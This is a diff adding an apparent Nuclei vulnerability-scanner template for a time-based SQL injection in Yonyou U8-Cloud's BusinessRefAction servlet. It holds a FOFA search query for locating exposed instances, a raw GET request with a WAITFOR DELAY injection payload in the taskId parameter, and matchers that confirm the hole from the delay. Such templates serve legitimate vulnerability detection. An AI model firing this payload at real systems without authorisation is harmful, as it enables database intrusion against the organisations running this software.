@@ -1,0 +1,26 @@
+id: yonyou-u8-cloud-businessrefaction-sqli
+
+info:
+  name: Yonyou U8-Cloud businessrefaction - SQL Injection
+  author: qwtd
+  severity: high
+  metadata:
+    fofa-query: app="用友-U8-Cloud"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+          - contains(body, "任务报表")
+        condition: and
